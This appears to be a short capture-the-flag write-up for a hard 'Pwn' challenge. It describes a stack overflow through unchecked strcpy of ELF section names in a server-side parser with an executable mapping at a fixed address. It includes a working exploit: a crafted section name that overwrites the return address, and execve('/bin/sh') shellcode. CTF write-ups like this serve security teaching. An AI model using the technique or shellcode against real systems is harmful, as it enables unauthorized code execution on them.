#ELFParser

**Author:** Xiao0o0o0o

**Difficulty:** Hard

**Category:** Pwn

## Title description

After learning the ELF file format, your roommate wrote an ELF file parser and deployed it on the server.

"Although you can upload an ELF at will, you can't execute it on my server at will, so it's safe!"

But is this really the case?

## Question analysis

**Exposed port: `70`**

```c
strcpy(v7, (const char *)(*(unsigned int *)(v4 + ((__int64)(int)i << 6)) + v3));
```

Note that when copying `Shdr.name`, there is no length limit, causing stack overflow. `strcpy()` will stop at `\x00`. Also note that when `mmap()`, `PROT_EXEC` is set, and The first parameter gives the address of the map `0x800000`, so you can write the shellcode in the ELF you uploaded, return oriented programming to the address of the map, and get the shell.

```c
int __attribute__((section("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2d\x11\x80"))) main() {
    __asm__ __volatile__
    (
     "movq $0x0068732f6e69622f, %rdx \n"
     "pushq %rdx                     \n"
     "movq $0x3b, %rax               \n"
     "movq %rsp, %rdi                \n"
     "movq $0, %rdx                  \n"
     "movq $0, %rsi                  \n"
     "syscall                        \n"
     "pop %rdi                       \n"
     "pop %rdx                       \n"
    );
}
```
